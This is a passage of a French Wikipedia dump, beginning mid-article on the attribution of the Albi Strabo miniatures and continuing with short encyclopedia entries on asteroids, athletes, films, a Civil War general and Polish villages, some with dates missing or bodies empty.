La question de l'attribution de ces deux miniatures se pose depuis longtemps. Millard Meiss, dans sa monographie consacrée à Andrea Mantegna en 1957, attribue les deux peintures à ce peintre et plus précisément à un de ses collaborateurs. Il compare ces deux images aux œuvres que le maître Mantegna exécute à la même époque à Padoue : les fresques de la chapelle Ovetari de l'église des érémitiques de Padoue et les panneaux du retable de l'église San Zeno de Vérone. Pour Meiss, ce collaborateur a dans le même temps été influencé par les premières œuvres de jeunesse de son beau-frère, Giovanni Bellini, qui travaille alors sur le retable de la chapelle Gattamelata de la basilique Saint-Antoine. De petits détails viennent rappeler l'œuvre de Mantegna : le palmier de la seconde miniature et l'architecture qui l'environne évoquent la colonne centrale et les bâtiments de la fresque du "Martyre de saint Christophe" représentée dans la chapelle Ovetari. Des documents viennent selon Meiss corroborer cette hypothèse. Deux lettres, datées du 4 et du 14 mars 1459, de , protecteur de Mantegna, autorisent ce dernier à rester encore quelque temps au service de Jacopo Antonio Marcello pour achever une avant de revenir à Mantoue. Cette « petite œuvre » serait la peinture de ces deux miniatures.
Cette attribution à l'atelier de Mantegna ne fait pas l'unanimité. L""' citée dans la lettre de Louis de Mantoue a été identifiée depuis à d'autres œuvres, comme tour à tour le "Saint Sébastien" de Vienne, "L'Agonie dans le jardin" de Londres ou encore le "Saint Georges" de Venise. Les miniatures du manuscrit d'Albi ont elles aussi été attribuées à d'autres artistes : les noms de Marco Zoppo et Lauro Padovano ont été avancés mais sans rencontrer de consensus. 
L'hypothèse de Giovanni Bellini a connu plus de succès. À l'époque du manuscrit, ce dernier travaille encore avec son père, Iacopo Bellini, dont il emprunte l'arc présent dans la première miniature. Il est aussi influencé par son beau-frère, Mantegna (qui s'est marié avec sa sœur), à travers des œuvres qui ont déjà été citées. Les miniatures sont sans doute l'œuvre d'un peintre peu habitué à réaliser des peintures pour manuscrits, comme c'est le cas de Giovanni Bellini, ce dont témoignent l'absence de cadre et la perspective rigoureuse. Par ailleurs, selon Luciano Bellosi, certains détails rappellent des œuvres de jeunesse de l'artiste : la pose, les traits et les costumes des personnages rappellent ceux des "Trois histoires de Drusienne et de saint Jean l'Évangéliste", une prédelle aujourd'hui conservée au château royal de Berchtesgaden. Les traits et chevelures des jeunes hommes rappellent aussi les personnages de "La Transfiguration du Christ" aujourd'hui conservée au Museo Correr.
Influence du manuscrit sur l'enluminure de son époque.
Le manuscrit a influencé l'enluminure de son époque à plusieurs points de vue. Ses lettrines se retrouvent dans de nombreux manuscrits par la suite, y compris dans des ouvrages français commandés par René d'Anjou. Les enlumineurs au service de sa cour, et particulièrement le Maître du Boccace de Genève, semblent s'être inspirés des modèles du Strabon pour les recopier dans leurs manuscrits des années 1470-1475. C'est le cas dans les "Heures de Philippe de Gueldre", un livre de prières, le "Rustican", le "Livre des stratagèmes" de Frontin, le ' de Raynerius de Pisis, les ' de saint Augustin ou un "Commentaire sur l'épître de saint Paul aux Romains" d'Origène.
Le Maître du Boccace de Genève s'est aussi inspiré des miniatures du livre d'Albi. Toujours dans le "Livre des stratagèmes", un personnage est figuré à la miniature du folio 115 représentant la préparation du triomphe de Pompée. Il reprend exactement la même attitude et le même costume que Marcello sur la première miniature du "De situ orbis". Ces miniatures ont aussi peut-être influencé Barthélemy d'Eyck dans certaines compositions et la posture de quelques courtisans des miniatures du "Livre des tournois" de René d'Anjou (f.3v. et f.11).

</doc>
<doc id="9411191" url="https://fr.wikipedia.org/wiki?curid=9411191" title="Escadron de chasse 1/20 Aurès Nementcha">
Escadron de chasse 1/20 Aurès Nementcha

L'escadron de chasse 1/20 Aurès Nementcha est une ancienne unité de chasse de l'armée de l'air française basé en Afrique du Nord entre le et le , au sein de la 20e escadre de chasse.
Durant toute son existence, le 1/20 a participé activement aux opérations de maintien de l'ordre de la Guerre d'Algérie.
Historique.
Le fanion de l'escadron, perdu en 1973 a été retrouvé en 2014 et remis au Service Historique de la Défense.
Appareils.
Durant sa courte histoire, le 1/20 a volé sur les appareils suivants:

</doc>
<doc id="9411199" url="https://fr.wikipedia.org/wiki?curid=9411199" title="The Red">
The Red

The Red est le premier album studio du girl group sud-coréen Red Velvet. Il est sorti le sous SM Entertainment et distribué par KT Music.

</doc>
<doc id="9411205" url="https://fr.wikipedia.org/wiki?curid=9411205" title="Saison 6 de Hawaii 5-0">
Saison 6 de Hawaii 5-0

Cet article présente la sixième saison de la série télévisée américaine Hawaii 5-0.
Synopsis.
Lors de la sixième saison, le commandant Steve McGarrett, ancien Navy Seals de la Marine des États-Unis, doit affronter Gabriel Waincroft, le petit frère de Malia Waincroft, qui pense qu'elle est morte par la faute de Chin Ho Kelly. De plus, Abby Dunn, détective de police de San Francisco, va se joindre au 5-0.
Production.
Le tournage a repris le .

</doc>
<doc id="9411206" url="https://fr.wikipedia.org/wiki?curid=9411206" title="Chateaubrun">
Chateaubrun



</doc>
<doc id="9411207" url="https://fr.wikipedia.org/wiki?curid=9411207" title="Stelios Mygiakis">
Stelios Mygiakis



</doc>
<doc id="9411208" url="https://fr.wikipedia.org/wiki?curid=9411208" title="Reinaldo Merlo">
Reinaldo Merlo

Reinaldo Carlos Merlo, né le , est un joueur et entraîneur de football argentin.
Carrière.
Surnommé "Mostaza" pour sa chevelure blonde Merlo joue toute sa carrière au Club Atlético River Plate en tant que milieu défensif. Il remporte de nombreux championnat d'Argentine sous la direction d'Ángel Labruna entre 1975 et 1981, puis Juan José López et Norberto Alonso.
Merlo est un des piliers défensifs de cette équipe, avec le gardien de but Ubaldo Fillol et le défenseur Daniel Passarella. River, cependant, recrute plusieurs fois des joueurs à son poste, comme Ramiro Pérez, "Chamaco" Rodríguez, Della Savia, Cierra, Carranza, Pitarch, de los Santos et Américo Gallego, le seul à avoir réussi à prendre la place de Merlo. Avant de terminer sa carrière sportive, Merlo cornaque un jeune joueur, Néstor Gorosito.
Merlo compte plus de 500 apparitions avec River Plate, dont 42 en Superclásico, un record. Il remporte sept titres avec le club de Buenos Aires.
Carrière d'entraîneur.
Après sa carrière de joueur, Merlo se reconvertit comme entraîneur. Il se forme et accepte d'entraîner plusieurs équipes modestes avant de se voir offrir le poste d'entraîneur de River Plate en 1989, en tandem avec Alonso. Merlo et Alonso sont remerciés à mi-saison par le nouveau président Davicce, qui avait promis au cours de l'élection la nomination de Daniel Passarella ; l'équipe remporte en fin d'année le championnat, un succès dont Merlo n'est pas étranger aux yeux des observateurs.
En 1999, Merlo dirige l'Atlético Nacional en Colombie ; malgré de bons résultats, ses choix sportifs sont impopulaires et il démissionne finalement après la première moitié de la saison. Son remplaçant Luis Fernando Suarez remporte le championnat.
En 2001, Merlo remporte avec le Racing Club le championnat d'ouverture d'Argentine, le premier titre national du club depuis 35 ans. Sa sérénité apparente et son insistance à prendre les matchs les uns après les autres lui valent le surnom de "paso a paso" (pas à pas).
Merlo se voit offrir le banc d'Estudiantes de La Plata après le départ de Carlos Bilardo en 2004. Il rétablit une situation sportive difficile et termine le tournoi d'ouverture 2004 et le tournoi de fermeture 2005 à la . Il démissionne en et retrouve River Plate quelques semaines plus tard à la place de Leonardo Astrada.
Le , après une première campagne relativement décevante, il démissionne et laisse la place à Passarella. Il semble que Marcelo Gallardo lui ai exprimé directement la défiance du vestiaire à son égard, provoquant le départ soudain de son entraîneur
Merlo fait ensuite des passages au Racing Club de Avellaneda et au Barcelona Sporting Club en Équateur, sans retrouver le succès.
En 2009, il dirige Rosario Central mais quitte le club après quelques semaines seulement, du fait de problèmes relationnels avec Ezequiel González.
En , Merlo retrouve un poste de manager au CA Douglas Haig, en Primera B Nacional.

</doc>
<doc id="9411209" url="https://fr.wikipedia.org/wiki?curid=9411209" title="(3254) Bus">
(3254) Bus

(3254) Bus est un astéroïde de la ceinture principale.
Description.
(3254) Bus est un astéroïde de la ceinture principale. Il fut découvert par Edward L. G. Bowell le à l'observatoire de Flagstaff. Il présente une orbite caractérisée par un demi-grand axe de 3,94 UA, une excentricité de 0,166 et une inclinaison de 4,446° par rapport à l'écliptique.
Il fut nommé en hommage à l'astronome Schelte J. Bus, dit « Bobby », assistant chercheur à l'observatoire Lowell.

</doc>
<doc id="9411210" url="https://fr.wikipedia.org/wiki?curid=9411210" title="Forte Montecchio Nord">
Forte Montecchio Nord

Le Forte Montecchio Nord est un fort situé à Colico en Italie près de la frontière avec la Suisse.

</doc>
<doc id="9411211" url="https://fr.wikipedia.org/wiki?curid=9411211" title="(3142) Kilopi">
(3142) Kilopi

(3142) Kilopi est un astéroïde de la ceinture principale.
Description.
C'est un astéroïde de la ceinture principale. Il fut découvert par André Patry le à Nice.
Son nom est un jeu de mots oral fondé sur l'homophonie et la polysémie (calembour, de kilo et pi équivalent à mille fois pi, avec π ≈ 3,142 : ce qui donne approximativement le nombre 3142).

</doc>
<doc id="9411213" url="https://fr.wikipedia.org/wiki?curid=9411213" title="Irini Kassimati">
Irini Kassimati



</doc>
<doc id="9411214" url="https://fr.wikipedia.org/wiki?curid=9411214" title="(3916) Maeva">
(3916) Maeva

(3916) Maeva est un astéroïde de la ceinture principale.
Description.
(3916) Maeva est un astéroïde de la ceinture principale. Il fut découvert par Henri Debehogne le à La Silla. Il présente une orbite caractérisée par un demi-grand axe de 3,24 UA, une excentricité de 0,1308 et une inclinaison de 1,94° par rapport à l'écliptique.
Il fut nommé à la mémoire de Maeva d'Halloy d'Hocquincourt, nièce de l'astronome Patrice Bouchet (membre du personnel de l'ESO), qui décéda tragiquement le à l'âge de 7 ans.

</doc>
<doc id="9411215" url="https://fr.wikipedia.org/wiki?curid=9411215" title="Evangelia Karakosta">
Evangelia Karakosta



</doc>
<doc id="9411218" url="https://fr.wikipedia.org/wiki?curid=9411218" title="Eleni Stamataki">
Eleni Stamataki



</doc>
<doc id="9411221" url="https://fr.wikipedia.org/wiki?curid=9411221" title="Konstantinos Dermitzakis">
Konstantinos Dermitzakis



</doc>
<doc id="9411223" url="https://fr.wikipedia.org/wiki?curid=9411223" title="Anna Vagena">
Anna Vagena



</doc>
<doc id="9411226" url="https://fr.wikipedia.org/wiki?curid=9411226" title="Stavros Arachovitis">
Stavros Arachovitis



</doc>
<doc id="9411229" url="https://fr.wikipedia.org/wiki?curid=9411229" title="Evangelia Vagionaki">
Evangelia Vagionaki



</doc>
<doc id="9411231" url="https://fr.wikipedia.org/wiki?curid=9411231" title="Pavlos Polakis">
Pavlos Polakis



</doc>
<doc id="9411233" url="https://fr.wikipedia.org/wiki?curid=9411233" title="Evgenia Ouzounidou">
Evgenia Ouzounidou



</doc>
<doc id="9411235" url="https://fr.wikipedia.org/wiki?curid=9411235" title="Efstathios Leoutsakos">
Efstathios Leoutsakos



</doc>
<doc id="9411236" url="https://fr.wikipedia.org/wiki?curid=9411236" title="Rachil Makri">
Rachil Makri



</doc>
<doc id="9411238" url="https://fr.wikipedia.org/wiki?curid=9411238" title="Dimitrios Dimitriadis">
Dimitrios Dimitriadis



</doc>
<doc id="9411240" url="https://fr.wikipedia.org/wiki?curid=9411240" title="Theodoros Parastatidis">
Theodoros Parastatidis



</doc>
<doc id="9411242" url="https://fr.wikipedia.org/wiki?curid=9411242" title="Alexandra Tsanaka">
Alexandra Tsanaka



</doc>
<doc id="9411244" url="https://fr.wikipedia.org/wiki?curid=9411244" title="Ilias Ioannidis">
Ilias Ioannidis



</doc>
<doc id="9411247" url="https://fr.wikipedia.org/wiki?curid=9411247" title="Saison 6 de Blue Bloods">
Saison 6 de Blue Bloods

Cet article présente le guide des épisodes de la sixième saison de la série télévisée américaine .

</doc>
<doc id="9411248" url="https://fr.wikipedia.org/wiki?curid=9411248" title="Manuel Tamayo y Baus">
Manuel Tamayo y Baus

Manuel Tamayo y Baus, né à Madrid en Espagne le et mort le dans la même ville, est un dramaturge espagnol.
Biographie.
Fils d'acteurs, il arrange, à l'âge de 10 ans, pour la compagnie où jouent ses parents, une "Geneviève de Brabant".
Il est employé au Ministère de l'Intérieur, puis bibliothécaire de l'Institut de San Isodoro à Madrid, enfin directeur de la Bibliothèque nationale espagnole.
Tamayo a été candidat à la députation carliste pour Santo Domingo de la Calzada en 1871 et Cervera en 1872.

</doc>
<doc id="9411249" url="https://fr.wikipedia.org/wiki?curid=9411249" title="Konstantin Ashurov">
Konstantin Ashurov

Konstantin Ashurov (en ukrainien : Костянтин Ашуров), né le à Donetsk, est un coureur cycliste ukrainien.
Biographie.
Konstantin Ashurov naît le à Donetsk en Ukraine.
Il commence le cyclisme sur route à l'âge de 12 ans. En 2010, il intègre l'école supérieure nationale d'éducation physique de Kiev (Ukraine). 
En 2014, il est vice-champion d'Ukraine de la course en ligne juniors et participe à ses premiers championnats du Monde, à Ponferrada (Espagne). En fin de saison, il participe à la dernière manche du championnat d'Ukraine sur route. Il remporte une étape et termine avec le maillot de meilleur grimpeur. 
Il entre dans l'équipe continentale ukrainienne Kyiv Capital Racing en 2015, et termine notamment quatrième du championnat d'Ukraine espoirs et deuxième de la Coupe d'Ukraine sur route.
Il est également sélectionné en équipe d'Ukraine pour la course en ligne du championnat d'Europe Espoirs à Tartu (Estonie).
Souhaitant rejoindre une équipe française, il s'engage pour la saison 2016 avec un club cycliste de la Manche, Bricquebec Cotentin. Il s'impose lors de la deuxième épreuve du Maillot des Jeunes Léopards. Il remporte à Odessa le championnat d'Ukraine du critérium. Il s'impose également lors de la première étape de la Coupe d'Ukraine sur route à Bila Tserkva. Il termine deuxième du classement général de la du Mémorial Colonel Skopenko, après avoir remporté la première étape. 
Il s'engage avec la formation italienne Big Hunter Beltrami Seanese pour 2017. 

</doc>
<doc id="9411253" url="https://fr.wikipedia.org/wiki?curid=9411253" title="Haut Valais">
Haut Valais



</doc>
<doc id="9411254" url="https://fr.wikipedia.org/wiki?curid=9411254" title="Abdel Latif Moubarak">
Abdel Latif Moubarak

Abdel Latif Moubarak, également connu sous le nom arabe d'عبد اللطيف مبارك, est un poète et parolier égyptien né en 1964 à Suez. Il est largement reconnu comme l'un des poètes les plus importants des années 1980. Ses poèmes ont été publiés dans de nombreuses revues littéraires en Égypte et dans le monde arabe, notamment Arab Magazine, Kuwait Magazine, News Literature, Republic Newspaper, AI-Ahram et The New Publishing Culture.
La renommée d'Abdel Latif Moubarak repose sur son style poétique distinctif qui combine habilement la beauté des mots avec une profonde réflexion sur les aspects de la vie et de l'humanité. Ses vers sont imprégnés de sensibilité, d'émotion et d'une connaissance profonde de la condition humaine. Il a remporté le prix international Sergio Camellini en Italie en 2025.
Au fil des années, Moubarak a reçu de nombreux prix et distinctions pour son travail. En 2014, il a été honoré en recevant le bouclier d'excellence et de créativité de l'Union des médias arabes, reconnaissant ainsi son impact significatif dans le domaine de la poésie et de la littérature. En 2021, il a également remporté le prestigieux bouclier d'excellence et de créativité de l'East Academy, témoignant de sa persévérance et de son dévouement continus à son art.
Abdel Latif Moubarak continue d'inspirer les lecteurs et les amateurs de poésie à travers ses écrits captivants. Sa contribution à la scène littéraire arabe est inestimable et son héritage perdurera pour les générations à venir. En tant que poète et parolier égyptien éminent, il a réussi à toucher les cœurs et les esprits de nombreux avec sa plume talentueuse et sa vision unique du monde.
L'œuvre d'Abdel Latif Moubarak transcende les frontières géographiques et culturelles, et sa renommée s'étend bien au-delà de l'Égypte. Son impact durable sur la poésie arabe est indéniable, et il continue d'être une source d'inspiration pour les jeunes poètes et écrivains qui aspirent à suivre ses traces.
En conclusion, Abdel Latif Moubarak est un poète et parolier égyptien éminent, dont les poèmes ont captivé les lecteurs et ont laissé une marque indélébile sur la scène littéraire arabe. Son talent et sa créativité ont été récompensés par de nombreux prix prestigieux, témoignant de sa contribution exceptionnelle à la poésie. Son héritage continuera d'inspirer et d'enchanter les générations futures, faisant de lui une figure importante dans le monde de la littérature.
Biographie.
Il est titulaire d'un baccalauréat en droit de l'université Ain Shams.
Il utilise dans ses poèmes l'arabe classique et l'arabe égyptien vernaculaire.
Il est membre de l"'Union des écrivains égyptiens" et membre des "Ecrivains arabes sur internet".

</doc>
<doc id="9411256" url="https://fr.wikipedia.org/wiki?curid=9411256" title="Une femme disparait (film, 1942)">
Une femme disparait (film, 1942)



</doc>
<doc id="9411257" url="https://fr.wikipedia.org/wiki?curid=9411257" title="L'Odyssée (film)">
L'Odyssée (film)

L'Odyssée est un film biographique français coécrit et réalisé par Jérôme Salle, sorti en 2016. Il s’agit du portrait de Jacques-Yves Cousteau qui fait aussi une large place à ses relations avec son fils cadet, Philippe Cousteau.
Il est présenté en ouverture au neuvième festival du film francophone d'Angoulême, en .
En 2017, le film reçoit le César du meilleur son.
Synopsis.
Après avoir quitté la Marine nationale française, Jacques-Yves Cousteau veut se lancer dans l'exploration sous-marine. En 1950, il loue le bateau "Calypso" à un riche britannique. Le « commandant » part alors aux quatre coins du Monde, avec sa femme Simone et notamment Albert « Bebert » Falco. Ses deux fils, Philippe Cousteau et Jean-Michel Cousteau, restent en pension... Quelques années plus tard, Philippe rejoint finalement l'équipe de son père, qui tourne une série de films documentaires financés par une chaîne de télévision américaine. Philippe étant sensibilisé à l'écologie à laquelle son père est insensible, il se brouille avec lui puis, alors que les affaires de Jacques-Yves périclitent, revient auprès de lui et le sensibilise à la protection des océans et des espèces animales menacées, donnant à la carrière de son père une nouvelle orientation et un nouveau départ.
Production.
Genèse et développement.
Jérôme Salle est un admirateur du commandant Cousteau depuis son enfance : . Dès 2004, après la sortie d'Anthony Zimmer, le réalisateur parle d'ailleurs du projet à ses producteurs. Il a notamment voulu faire ce film en se rendant compte que son fils ne connaissait absolument pas le commandant Cousteau. Jérôme Salle a alors pensé que l'idole de son enfance était en train de tomber dans l'oubli :
En 2011, il est confirmé que Jérôme Salle travaille sur un film biographique sur Jacques-Yves Cousteau, adapté du livre "Capitaine De La Calypso" d'Albert Falco et Yves Paccalet. Le réalisateur projette par ailleurs de faire un film en 3D pour un budget d’environ . Entre-temps, Jérôme Salle met en scène le film policier "Zulu", qui sort en 2013.
Fidélité Productions, producteur du réalisateur, conscient des coûts d'un tel projet, décide d'unir ses forces avec la société de production Pan Européenne qui a acheté les droits du livre d'Albert Falco.
Jérôme Salle écrit le scénario avec Laurent Turner. Ils effectuent un important travail de recherche durant le processus d'écriture et rencontrent des personnes ayant connu le commandant. Jérôme Salle raconte : . Jérôme Salle a notamment rencontré Jan, la veuve de Philippe Cousteau : . Jérôme Salle évoque également l'influence du "Parrain" sur le film tant les deux histoires nous plongent dans des sagas familiales hors-normes.
En , une première affiche est dévoilée. Cependant, en , il est annoncé que le projet est mis en pause : .
Le projet est relancé en lorsque le réalisateur confirme les trois acteurs principaux sur Twitter et annonce un tournage prévu courant 2015.
Attribution des rôles.
En 2014, Pierre Niney est confirmé dans le rôle du fils du Commandant, Philippe Cousteau. Il explique alors : . Quelque temps plus tard, c'est Romain Duris qui est annoncé dans le rôle principal. Finalement, en , Lambert Wilson est confirmé dans le rôle principal alors qu'Audrey Tautou jouera sa femme Simone.
Tournage.
Le tournage commence en et doit se poursuivre jusqu'au début de 2016. Il se déroule en Méditerranée, en Afrique du Sud, et en Antarctique notamment. La Croatie a servi pour reconstituer la Côte d'Azur des années 1940-1950.
Musique.
La musique du film est composée par Alexandre Desplat. Jérôme Salle explique leur collaboration : 
L'album de la bande originale contient également quelques chansons pop rock et soul entendues dans le film.
Accueil.
Festivals et sorties.
"L'Odyssée" est présenté en ouverture au neuvième Festival du film francophone d'Angoulême, le , puis en clôture du Festival international du film de Saint-Sébastien, le .
Critique.
Le scénario déforme ou dramatise parfois la réalité :

</doc>
<doc id="9411258" url="https://fr.wikipedia.org/wiki?curid=9411258" title="Haralds Kārlis">
Haralds Kārlis

Haralds Kārlis, né le , à Riga, en Lettonie, est un joueur letton de basket-ball. Il évolue aux postes d'arrière et d'ailier.

</doc>
<doc id="9411259" url="https://fr.wikipedia.org/wiki?curid=9411259" title="Leslie Megahey">
Leslie Megahey

Leslie Megahey, né le 27 décembre 1944 et mort le , est un producteur, réalisateur et auteur de télévision britannique.

</doc>
<doc id="9411268" url="https://fr.wikipedia.org/wiki?curid=9411268" title="Julia Glushko">
Julia Glushko

Julia Glushko (en hébreu : יוליה גלושקו), née le à Artemivsk, dans l'oblast de Donetsk, est une joueuse de tennis israélienne, professionnelle de 2005 à 2019.
Biographie.
Julia Glushko est né à Donetsk, en RSS d'Ukraine, alors en URSS. Elle parle couramment l'hébreu, le russe et l'anglais.
Elle a commencé à jouer au tennis à l'âge de quatre ans. Ses parents, Sergio et Olga, sont professeurs de tennis. Glushko et sa famille ont immigré d'Ukraine en Israël quand elle avait neuf ans, vivant d'abord dans le quartier Katamon de la ville de Jérusalem pendant trois ans, puis dans la ville de Ramat HaSharon.
Elle s'est ensuite formée au Wingate Institute de Netanya. Elle a servi dans les Forces de défense israéliennes pendant plus de deux ans. Elle vit à Modi'in, à mi-chemin entre Jérusalem et Tel Aviv, en Israël. Sa sœur cadette, Lina Glushko, est également joueuse de tennis, avec laquelle elle a fait équipe en tant que partenaire de double.
Carrière.
Elle a depuis remporté vingt titres sur le Circuit ITF dont huit en simple et douze en double. Elle a également atteint à deux reprises une finale de tournoi WTA 125K Series, une en simple à Dalian en 2015 et deux en double respectivement à Pune en 2012 puis Zhengzhou en 2017.
Elle remporte son huitième tournoi ITF le lors du Challenger Banque Nationale de Granby, battant en finale l'Australienne Arina Rodionova.
Parcours en Grand Chelem.
En double dames.
"N'a jamais participé à un tableau final."
Parcours en « Premier Mandatory » et « Premier 5 ».
Découlant d'une réforme du circuit WTA inaugurée en 2009, les tournois WTA « Premier Mandatory » et « Premier 5 » constituent les catégories d'épreuves les plus prestigieuses, après les quatre levées du Grand Chelem.

</doc>
<doc id="9411270" url="https://fr.wikipedia.org/wiki?curid=9411270" title="Marguerite-Zéolide Lecran">
Marguerite-Zéolide Lecran

Marguerite-Zéolide Lecran, née à Bordeaux le et morte le dans le , est une artiste peintre française.
Biographie.
Portraitiste, peintre de genre et de sujets religieux, élève de François-Édouard Picot et d'Alexis-Nicolas Pérignon, elle débute au Salon de 1848 et y participe régulièrement jusqu'en 1880. On lui doit de nombreuses copies de grands maîtres comme Le Corrège, Le Pérugin ou Murillo.

</doc>
<doc id="9411275" url="https://fr.wikipedia.org/wiki?curid=9411275" title="Pitkänen">
Pitkänen

Pitkänen est un patronyme finnois porté notamment par :

</doc>
<doc id="9411278" url="https://fr.wikipedia.org/wiki?curid=9411278" title="Le Loup de la nuit">
Le Loup de la nuit

Le Loup de la nuit (titre original : "") est un téléfilm américain de Daniel Petrie diffusé en 1972 sur ABC.
Le film se déroule en Louisiane. Le corps d’une jeune femme, employée de maison, est retrouvé sauvagement lacéré. Les autochtones accusent des chiens sauvages d'être à l'origine de ce meurtre mais le shérif comprend rapidement que les animaux sont hors de cause. 
Synopsis.
Dans un bayou de Louisiane, des chasseurs retrouvent le corps lacéré d'une jeune femme, Ellie Burrifors. Le shérif Whitaker est chargé de l'enquête. Il découvre que le tueur l'a d'abord assommée avant de la tuer. Le médecin, qui fait aussi office de médecin légiste, l'informe que le meurtrier est gaucher. Lawrence, un ami de la jeune femme confesse au shérif qu'Ellie fréquentait un homme de la haute société, un certain Andrew Rodanthe.
De retour sur les lieux du meurtre, le shérif trouve un collier avec un camée en pendentif. Peu de temps après, il apprend que la victime était enceinte, ce que le légiste lui avait caché. Ce dernier avoue qu’il est le père de l’enfant et était amoureux de la défunte. C’était d’ailleurs avec lui qu’elle avait rendez-vous ce soir-là. Il reconnait également qu’il voulait qu’elle avorte mais qu’elle refusait et voulait l’épouser. Il se dit néanmoins complètement innocent. A la question du shérif, il précise être droitier. Le shérif l’interroge ensuite pour savoir s’il reconnait le camée qu’il a ramassé sur les lieux mais le bijou ne dit rien au médecin.
Quand le frère de Ellie découvre la liaison de sa sœur avec le médecin, il l’agresse. Arrêté, il est ensuite mystérieusement assassiné dans sa cellule : son corps est couvert de griffures et les barreaux ont été arrachés avec une force prodigieuse.
Le pendentif se révèle appartenir à la sœur de Andrew Rodanthe, elle l’avait perdu depuis longtemps. C’est son frère qui en réalité l’avait offert à Ellie ce soir-là. Il souffre depuis des années de crises de malaria qui le laissent sans connaissance pendant plusieurs heures. Il n’a aucun souvenir de la nuit du meurtre. Du moins c’est ce qu’il prétend. Il apprend parallèlement au médecin être parfaitement ambidextre. 
Victime d’une nouvelle crise, il est hospitalisé à la clinique locale. Durant la nuit, il se change en loup garou et, après avoir blessé plusieurs membres du personnel médical, s’enfuit. Il essaye ensuite de tuer sa sœur, réfugiée dans la grande maison familiale sous la protection du shérif. Quand Andrew se précipite sur elle, elle l’abat avec son revolver dont les balles avaient été préalablement bénies. 

</doc>
<doc id="9411279" url="https://fr.wikipedia.org/wiki?curid=9411279" title="Yakup Gor">
Yakup Gor



</doc>
<doc id="9411282" url="https://fr.wikipedia.org/wiki?curid=9411282" title="Solar Dynamics Observatory">
Solar Dynamics Observatory



</doc>
<doc id="9411284" url="https://fr.wikipedia.org/wiki?curid=9411284" title="William Thomas Harbaugh Brooks">
William Thomas Harbaugh Brooks

William Thomas Harbaugh Brooks (né le à Lisbon, État de Ohio, et mort le à Huntsville, État de l'Alabama) est un major général de l'Union Army. Il est enterré à Huntsville, État d'Alabama.
Avant la guerre.
William Thomas Harbaugh Brooks sort diplômé de West Point en 1841.
Il est breveté second lieutenant le dans le "3rd U.S. Infantry" et est promu à ce grade le . Affecté à la frontière dans l'Ouest, il participe aux guerres séminoles. Il reste en Floride jusqu'en 1843.
Il est promu premier lieutenant le .
Il participe à la guerre américano-mexicaine. Il est breveté capitaine le pour bravoure et conduite méritoire lors de plusieurs engagements lors de la bataille de Monterrey. Il est breveté commandant le pour bravoure et conduite méritoire lors de la bataille de Contreras et lors de la bataille de Churubusco. Il réalise la reconnaissances des ouvrages lors des batailles de Cerro Gordo et de Contreras. Il participe ensuite à la bataille de Mexico. Il finit la guerre dans l'état-major du brigadier général David E. Twiggs et reste à ce poste jusqu'en 1851.
Il est promu capitaine le .
En 1856, il souffre de problèmes urinaires. Dans une de ses lettres, envoyée de fort Defiance, il écrit qu'il n'a pu sortir pour une campagne en raison de frissons et d'une fièvre
Guerre de Sécession.
William Thomas Harbaugh Brooks est capitaine au fort Hamilton dans l'État de New York lorsque la guerre éclate. Ses problèmes de santé s'aggravent à cette époque. Il est absent quatre mois de son régiment pour subir une opération. Il est nommé brigadier général des volontaires le . Il commande alors la "2nd brigade" de la "2nd division" du .
Il est promu commandant dans le "18th U.S. Infantry" le .
Il participe à la campagne de la Péninsule. Il est légèrement blessé à la jambe le lors de la bataille de Savage's Station. Il participe à la bataille des Sept Jours. Il est de nouveau blessé le lors de la bataille d'Antietam par une balle qui l'atteint au visage.
Lors de la bataille de Fredericksburg, il commande la "1st division" du au sein de la "grande division de gauche". Il est sous les ordres du général William Farrar Smith. Le major général Ambrose Burnside rend partiellement coupable Brooks de la défaite de Fredericksburg. Il tente alors vainement de le renvoyer des services fédéraux. Brooks s'engage alors dans une querelle intense avec Burnside, ce qui lui coûtera à terme sa carrière. Après la Mud March, Burnside envoie des courriers secrets au président Abraham Lincoln où, dans son "General Orders Number 8", il émet à l'encontre de Brooks des « critiques contre la politique du gouvernement »
Il participe à la bataille de Chancellorsville. Il est nommé major général des volontaires le . En , il prend le commandement du département de Monongahela stationné à Pittsburg. À partir d', il commande la "1st division" du "XVIII corps" de l'armée de la James. Il participe à la bataille de Cold Harbor. Il commande le "X corps" de l'armée de James au début de la campagne de Petersburg. Il participe à la bataille de Petersburg.
Pour les problèmes de santé, il demande à démissionner. Sa nomination de major général des volontaires est révoquée le et quitte le service actif des volontaires à cette date.
Après la guerre.
William Thomas Harbaugh Brooks s'installe à Huntsville en Alabama en tant que fermier. Entre son arrivée à Huntsville et , il perd , et revient à son poids de sortie de West Point soit . Il est accueilli dans la communauté comme un ancien ennemi aimable et estimé. Il meurt d'une nouvelle crise urinaire.

</doc>
<doc id="9411288" url="https://fr.wikipedia.org/wiki?curid=9411288" title="Tornade solaire">
Tornade solaire

Une tornade solaire est une forme de tourbillon observé à la surface du Soleil et est plus grande que la terre 
Au premier rang de celles repérées par l'Observatoire de la dynamique solaire, se trouvent la tornade de septembre 2011 et celle du début septembre 2015.

</doc>
<doc id="9411289" url="https://fr.wikipedia.org/wiki?curid=9411289" title="Žanis Peiners">
Žanis Peiners

Žanis Peiners, né le , à Rēzekne, en Lettonie, est un joueur letton de basket-ball. Il évolue aux postes d'ailier et d'ailier fort.

</doc>
<doc id="9411292" url="https://fr.wikipedia.org/wiki?curid=9411292" title="Bonikowo">
Bonikowo

Bonikowo (prononciation : ) est un village polonais de la gmina de Kościan dans le powiat de Kościan de la voïvodie de Grande-Pologne dans le centre-ouest de la Pologne.
Il se situe à environ au nord de Kościan (siège de la gmina et du powiat) et à au sud-ouest de Poznań (capitale régionale).
Le village possédait une population de en 2009.
Histoire.
De 1975 à 1998, le village faisait partie du territoire de la voïvodie de Leszno.&lt;br&gt;
Depuis 1999, Bonikowo est situé dans la voïvodie de Grande-Pologne.

</doc>
<doc id="9411295" url="https://fr.wikipedia.org/wiki?curid=9411295" title="Choryń">
Choryń

Choryń (prononciation : ) est un village polonais de la gmina de Kościan dans le powiat de Kościan de la voïvodie de Grande-Pologne dans le centre-ouest de la Pologne.
Il se situe à environ au sud-est de Kościan (siège de la gmina et du powiat) et à au sud de Poznań (capitale régionale).
Le village possédait une population de en 2009.
Histoire.
De 1975 à 1998, le village faisait partie du territoire de la voïvodie de Leszno.&lt;br&gt;
Depuis 1999, Choryń est situé dans la voïvodie de Grande-Pologne.

</doc>
<doc id="9411297" url="https://fr.wikipedia.org/wiki?curid=9411297" title="Tour Vauban (Epiry)">
Tour Vauban (Epiry)

Le château d'Epiry dans le département de la Nièvre dans la commune d'Epiry, est une ancienne maison-forte dont ne subsiste qu'une tour dite Tour Vauban qui fait l’objet d’une inscription au titre des monuments historiques depuis le .
